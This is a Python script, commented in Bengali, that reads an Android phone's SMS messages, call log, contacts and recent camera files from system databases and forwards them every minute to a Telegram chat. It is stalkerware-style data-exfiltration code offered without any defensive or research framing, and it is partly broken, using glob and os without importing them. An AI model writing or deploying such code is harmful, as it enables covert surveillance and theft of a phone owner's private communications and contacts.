import sqlite3
import time
import json
from datetime import datetime
from telegram import Bot

# টেলিগ্রাম বট টোকেন এবং চ্যাট আইডি কনফিগারেশন ফাইল থেকে পড়া
with open('config.json', 'r') as f:
    config = json.load(f)

tg_token = config['tg_token']
tg_chat_id = config['tg_chat_id']
bot = Bot(token=tg_token)

def send_telegram_message(message):
    try:
        bot.send_message(chat_id=tg_chat_id, text=message)
    except Exception as e:
        print(f"Error in sending Telegram message: {e}")

def send_sms_report():
    try:
        # SMS ডাটাবেস ফাইলের পাথ
        sms_db_path = "/data/data/com.android.providers.telephony/databases/mmssms.db"
        conn = sqlite3.connect(sms_db_path)
        cursor = conn.cursor()

        # সর্বশেষ ১০টি SMS বার্তা পড়া
        cursor.execute("SELECT address, date, body FROM sms ORDER BY date DESC LIMIT 10")
        sms_data = cursor.fetchall()

        sms_report = "📩 New SMS Messages:\n\n"

        for msg in sms_data:
            sender = msg[0]
            date = datetime.utcfromtimestamp(int(msg[1]) / 1000).strftime('%Y-%m-%d %H:%M:%S')
            body = msg[2]

            # বার্তা ফরম্যাট
            sms_report += f"From: {sender}\nTime: {date}\nMessage: {body}\n\n"

        send_telegram_message(sms_report)  # টেলিগ্রামে পাঠানো

    except Exception as e:
        print(f"Error in SMS report: {e}")

def send_call_log_report():
    try:
        # কল লগ ডাটাবেস ফাইলের পাথ
        call_log_db_path = "/data/data/com.android.providers.contacts/databases/calllog.db"
        conn = sqlite3.connect(call_log_db_path)
        cursor = conn.cursor()

        # সর্বশেষ ১০টি কল লগ পড়া
        cursor.execute("SELECT number, date, duration, type FROM calls ORDER BY date DESC LIMIT 10")
        call_data = cursor.fetchall()

        call_report = "📞 Recent Call Logs:\n\n"

        for call in call_data:
            number = call[0]
            date = datetime.utcfromtimestamp(int(call[1]) / 1000).strftime('%Y-%m-%d %H:%M:%S')
            duration = call[2]
            call_type = "Incoming" if call[3] == 1 else "Outgoing"

            # কল লগ ফরম্যাট
            call_report += f"Number: {number}\nTime: {date}\nDuration: {duration}s\nType: {call_type}\n\n"

        send_telegram_message(call_report)  # টেলিগ্রামে পাঠানো

    except Exception as e:
        print(f"Error in call log report: {e}")

def send_contact_report():
    try:
        # কন্টাক্ট ডাটাবেস ফাইলের পাথ
        contacts_db_path = "/data/data/com.android.providers.contacts/databases/contacts2.db"
        conn = sqlite3.connect(contacts_db_path)
        cursor = conn.cursor()

        # সর্বশেষ ১০টি কন্টাক্ট পড়া
        cursor.execute("SELECT display_name, number FROM view_data ORDER BY display_name ASC LIMIT 10")
        contact_data = cursor.fetchall()

        contact_report = "📇 New Contacts:\n\n"

        for contact in contact_data:
            name = contact[0]
            number = contact[1]

            # কন্টাক্ট ফরম্যাট
            contact_report += f"Name: {name}\nPhone: {number}\n\n"

        send_telegram_message(contact_report)  # টেলিগ্রামে পাঠানো

    except Exception as e:
        print(f"Error in contact report: {e}")

def send_file_report():
    try:
        # ছবি বা ভিডিও ডিরেক্টরি
        watch_directory = "/sdcard/DCIM/Camera/"  # ছবির বা ভিডিও ফোল্ডারের পাথ
        files = glob.glob(watch_directory + "*")

        file_report = "🖼️ New Files/Photos/Videos:\n\n"
        for file in files:
            if os.path.getctime(file) > time.time() - 3600:  # শেষ ১ ঘণ্টার মধ্যে যা এসেছে
                file_report += f"File: {file}\n\n"
                send_telegram_message(file_report)  # টেলিগ্রামে ফাইল পাঠানো

    except Exception as e:
        print(f"Error in file report: {e}")

def start_monitoring():
    while True:
        send_sms_report()
        send_call_log_report()
        send_contact_report()
        send_file_report()
        time.sleep(60)  # প্রতি ১ মিনিট পরপর চেক করবে

if __name__ == "__main__":
    start_monitoring()
